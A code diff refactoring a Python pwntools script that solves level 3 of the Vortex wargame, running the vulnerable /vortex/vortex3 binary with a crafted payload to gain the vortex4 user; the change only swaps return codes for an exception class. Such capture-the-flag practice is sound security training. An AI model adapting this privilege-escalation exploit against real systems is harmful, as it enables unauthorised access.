@@ -8,18 +8,14 @@ import subprocess
 import pwn
 
 
-def expl0it():
-    '''
-    exploit the target vulnerable process
+class ExploitFailedError(Exception):
+    pass
 
-    return (int: 1) on success and (int: 0) on failure
-    '''
-
+def exploit():
     try:
         vortex4_uid = pwd.getpwnam('vortex4').pw_uid
     except KeyError:
-        print 'user vortex4 does not exist'
-        return 0
+        raise ExploitFailedError('user vortex4 does not exist')
 
     pwn.context(arch='i386', os='linux')
 
@@ -42,12 +38,13 @@ def expl0it():
     print 'trying to expl0it the vulnerable process'
 
     exit_stat = subprocess.call(['/vortex/vortex3', expegg])
-    
-    return 0 if exit_stat != os.EX_OK else 1
-        
+    if exit_stat != os.EX_OK:
+        raise ExploitFailedError(
+            'failed to exploit the target vulnerable process')
 
 
 if __name__ == '__main__':
-    expl0it_success = expl0it()
-    if not expl0it_success:
-        print 'failed to expl0it the target vulnerable process'
+    try:
+        exploit()
+    except ExploitFailedError as e:
+        print e.message
